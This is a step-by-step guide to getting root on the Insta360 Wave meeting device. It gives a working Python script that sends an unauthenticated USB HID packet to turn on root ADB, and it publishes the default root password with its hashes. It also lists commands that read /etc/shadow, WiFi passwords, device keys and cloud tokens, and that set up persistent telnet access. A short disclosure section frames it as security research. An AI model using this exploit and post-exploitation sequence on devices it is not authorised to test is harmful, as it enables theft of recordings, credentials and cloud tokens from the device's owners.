# Insta360 Wave — Device Access Guide

How to gain root access to the Insta360 Wave without opening the device.

---

## Quick Reference

| Method | Access Level | Requirements | Status |
|---|---|---|---|
| **USB ADB** | Root shell | USB-C cable + HID packet | **Working** |
| Telnet (port 23) | Root shell | Network + password `123456` | **Disabled** in v1.1.6.6 |
| Serial UART | Root shell | Physical disassembly | Not tested |
| ZeroMQ (port 5533) | Read-only monitoring | Network | Open but output-only |
| USB File Transfer | File access only | USB-C + touchscreen | Working (limited) |

---

## Method 1: USB ADB (Recommended)

This is the primary access method. It works by sending a specially crafted USB HID packet that triggers the device's hidden ADB enable command.

### Prerequisites

```bash
# Install required tools (macOS)
brew install android-platform-tools   # ADB
pip3 install --break-system-packages hidapi  # USB HID library (use your pip3 path)
```

### Step 1: Connect USB-C

Plug the Insta360 Wave into your Mac via USB-C cable. Verify it appears:

```bash
ioreg -p IOUSB -l 2>/dev/null | grep "USB Product Name"
# Should show: "USB Product Name" = "psp"
```

Device details:
- Vendor: `insta360` (VID `0x18F0`)
- Product: `psp` (PID `0x4E40`)
- Serial: `PSP_<unique_id>`

### Step 2: Send ADB Enable Command

Save this as `enable_adb.py` and run it:

```python
#!/usr/bin/env python3
"""Enable ADB on Insta360 Wave via USB HID."""
import hid

VID = 0x18F0  # Insta360
PID = 0x4E40  # Wave (psp)

# Find vendor HID interface (usage page 0xFF00)
devices = hid.enumerate(VID, PID)
target = next((d for d in devices if d['usage_page'] == 0xFF00), None)
if not target:
    print("ERROR: Insta360 Wave not found. Is USB connected?")
    exit(1)

print(f"Found: {target['product_string']} (SN: {target['serial_number']})")
h = hid.device()
h.open_path(target['path'])
h.set_nonblocking(1)

# Drain pending data
while h.read(64):
    pass

# HID packet format (from decompiled firmware):
#   byte[0]  = 0x03  (Report ID for vendor usage page)
#   byte[1]  = 0xF0  (HID_MSG_TYPE_OF_SWT_FACTORY)
#   byte[2]  = 0x00  (sub-command check: must be 0x00)
#   byte[3]  = 0x00
#   byte[4]  = 0xF0  (sub-command: -0x10 as signed char)
#   byte[5]  = 0xC0  (sub-command: -0x40 = ADB enable)
#   byte[6..63] = 0x00 (padding)

pkt = bytearray(64)
pkt[0] = 0x03   # Report ID
pkt[1] = 0xF0   # HID_MSG_TYPE_OF_SWT_FACTORY
pkt[2] = 0x00   # Must be 0x00
pkt[3] = 0x00
pkt[4] = 0xF0   # 0xF0 = -0x10 signed
pkt[5] = 0xC0   # 0xC0 = -0x40 signed → ADB enable

print("Sending ADB enable command...")
h.write(bytes(pkt))
print("Sent! USB will re-enumerate. Wait 3 seconds, then run: adb devices")
h.close()
```

```bash
python3 enable_adb.py
```

**Note:** The USB device will re-enumerate after this command, which is expected. The HID connection will drop.

### Step 3: Connect via ADB

```bash
# Wait a few seconds for USB re-enumeration
sleep 3
adb devices
# Should show: PSP_<serial>    device

# Get a root shell
adb shell
# You are now root@buildroot
```

### Step 4: Explore

```bash
# System info
uname -a                           # Linux buildroot 5.4.242
cat /etc/shadow                    # Password hashes
cat /model/model_version.txt       # AI model version

# List AI models (4 GB on /model partition)
find /model -type f -ls

# List recordings
ls /mnt/udisk/AIRecord/

# View running processes
ps aux

# Check network config
ifconfig
cat /tmp/wpa_supplicant.conf

# Read device secrets
cat /sys/class/unifykeys/read

# Pull files to your Mac (from another terminal)
adb pull /model/ ./device_models/
adb pull /opt/logs/psp.log ./
```

### Other HID Commands

The same HID packet format supports three factory commands:

| Sub-command byte[5] | Action | Description |
|---|---|---|
| `0xEE` (-0x12) | Factory mode | `system_server_swt_usb_mode(6)` |
| `0xE0` (-0x20) | User mode | Restore normal USB mode |
| `0xC0` (-0x40) | **ADB enable** | `system_server_swt_usb_mode(5)` |

To switch back to normal mode after ADB:

```python
pkt[5] = 0xE0  # User mode (restore normal USB)
```

---

## Method 2: Telnet (v1.0.13.6 and earlier)

Telnet is present but **not started** in firmware v1.1.6.6. The `inetd` daemon is never launched by any init script. However, if you're on an older firmware version:

```bash
telnet <device-ip> 23
# Login: root
# Password: 123456
```

The password `123456` was cracked from the SHA-256-crypt hash in `/etc/shadow` using hashcat (mode 7400, brute-force 6-digit numeric, <3 minutes on Apple Silicon).

### Password Hashes

| Version | Hash | Password |
|---|---|---|
| v1.1.6.6 | `$5$f9rdYTjzvJ$tiE3E0n0jM1eaEOAbP3mAGdiHS862RHGr3ae3VglmG/` | `123456` |
| v1.0.13.6 | `$5$6PnLbyshVm.$Q62hB3TlLFnlpuSWJooP6xINNc7vciuGVuORjx673zD` | `123456` |

**Note:** The on-device hash may differ from the firmware image hash. The live device showed `$1$` (MD5-crypt) instead of `$5$` (SHA-256-crypt), suggesting the password system was changed at runtime or by an overlay.

---

## Method 3: USB File Transfer (Limited)

This gives file-level access to the user storage partition only (recordings, logs), **not** root shell access or the system/model partitions.

1. On the Wave touchscreen: **Settings → USB Mode → File Transfer**
2. The device mounts as `Wave Files` on your Mac
3. Available contents:
   - `AIRecord/` — Meeting recordings (MP3 + OGG + JSON)
   - `LOG/` — Cached firmware files
   - `Insta360_Wave_Controller/` — Controller installer
   - `misc/` — System temp files

---

## Method 4: Network ZeroMQ (Monitoring Only)

The device exposes two ZeroMQ ports:

| Port | Type | Binding | Purpose |
|---|---|---|---|
| 5533 | PUB (publish) | `tcp://*:5533` | Device → PC (HID events, heartbeats) |
| 5544 | SUB (subscribe) | `tcp://127.0.0.1:5544` | PC → Device (localhost only) |

Port 5533 is network-accessible but **read-only** — the device publishes events and you can subscribe. You cannot send commands through it.

```python
import zmq
context = zmq.Context()
sub = context.socket(zmq.SUB)
sub.connect("tcp://<device-ip>:5533")
sub.setsockopt(zmq.SUBSCRIBE, b"")
sub.setsockopt(zmq.RCVTIMEO, 10000)
try:
    msg = sub.recv_multipart()
    print(f"Received: {[frame.hex() for frame in msg]}")
except zmq.Again:
    print("No data (device only publishes when Wave Controller is active)")
```

---

## What You Can Do With Root Access

### Extract AI Models

```bash
# Pull the entire 4 GB model partition
adb pull /model/ ./device_models/

# Models include:
# - SenseVoice (Chinese offline ASR) — .nb format
# - Zipformer (Chinese online ASR) — .nb format
# - Reverb-ASR (English ASR) — .nb format
# - German/French/Japanese ASR — .nb format
# - Silero VAD v5 — .onnx format (2.2 MB)
# - CAM++ speaker diarization — .nb format (17 MB, FP16)
# - Punctuation models — .onnx format (269 MB + 266 MB)
```

### Enable Telnet/SSH Permanently

```bash
adb shell

# Enable telnet
echo "telnet stream tcp nowait root telnetd telnetd -i" > /etc/inetd.conf
inetd &

# Or install SSH (dropbear)
# The rootfs is writable via overlayfs in /data/overlay/
```

### Capture Audio Pipeline Data

```bash
adb shell

# Enable audio dumps
touch /tmp/AUDIO_VERBOSE
touch /tmp/DUMP_ASR_TRANS_AUDIO
touch /data/DOA_ENABLE

# Dumps appear in /mnt/udisk/audio_dump/ and /mnt/udisk/asr_dump/
# Pull them:
adb pull /mnt/udisk/audio_dump/ ./audio_dumps/
```

### Monitor Real-Time Logs

```bash
adb shell tail -f /opt/logs/psp.log
```

### Access Device Secrets

```bash
adb shell

# Device serial and secrets
cat /sys/class/unifykeys/name    # List available keys
cat /sys/class/unifykeys/read    # Read current key

# Device configuration database
ls /data/common_settings/

# WiFi passwords
cat /tmp/wpa_supplicant.conf

# Cloud tokens
# Stored in the in-memory database, visible in logs:
grep "device_secret\|device_token\|salt" /opt/logs/psp.log
```

---

## Troubleshooting

### ADB Device Not Showing

If `adb devices` shows empty after sending the HID command:

1. Check USB connection: `ioreg -p IOUSB -l | grep "psp"`
2. Restart ADB server: `adb kill-server && adb start-server`
3. Re-send the HID command (the mode switch may have timed out)
4. The device may revert to normal USB mode after reboot — you'll need to re-send the HID command each time

### HID Device Not Found

If `hid.enumerate(0x18F0, 0x4E40)` returns empty:

1. Make sure the device isn't in File Transfer mode (exit via touchscreen)
2. Unplug and replug the USB-C cable
3. Check if another app has claimed the HID interface (close Wave Controller)

### ADB Access Lost After Reboot

The ADB mode is **not persistent** — it resets when the device reboots. To re-enable:

1. Reconnect USB-C
2. Run `enable_adb.py` again
3. `adb devices`

For persistent access, use ADB to enable telnet or install SSH.

---

## Technical Details

### How the ADB Enable Works

From decompiled `libins_entry.so` (`recv_hid_data` at offset `0x0029c550`):

1. USB HID report (64 bytes, Report ID 0x03) arrives at the vendor interface
2. `change_carray_to_hid_vendor_package()` parses it:
   - `byte[0]` = Report ID (must be 0x03)
   - `byte[1]` → message type (`local_b4`)
   - `byte[2..9]` → message ID
   - `byte[10]` → data length
   - `byte[11..62]` → payload
3. When `message_type == 0xF0` (HID_MSG_TYPE_OF_SWT_FACTORY):
   - Checks `byte[2] == 0x00 && byte[4] == 0xF0 && byte[5] == 0xC0`
   - Calls `system_server_swt_usb_mode(5)` → enables ADB
4. The USB gadget reconfigures: drops UAC+HID, enables ADB interface
5. Device re-enumerates on USB bus

### USB Gadget Modes

| Mode | Function | Configuration |
|---|---|---|
| 0 | Default | UAC 2.0 + HID (Vendor+Telephone+Consumer) |
| 1 | File Transfer | Mass Storage (exposing /mnt/udisk) |
| 5 | **ADB** | Android Debug Bridge |
| 6 | Factory | Factory test mode |

---

## Security Disclosure

These findings are documented for security research and device interoperability purposes. The root access methods described here exploit:

1. **Unauthenticated USB HID command** — No encryption, no authentication. Any software with USB HID access can send the ADB enable packet.
2. **Default root password** — `123456` across all devices and firmware versions.
3. **ADB runs as root** — No user separation, no authorization prompt on the device.

These should be reported to Insta360 for remediation.
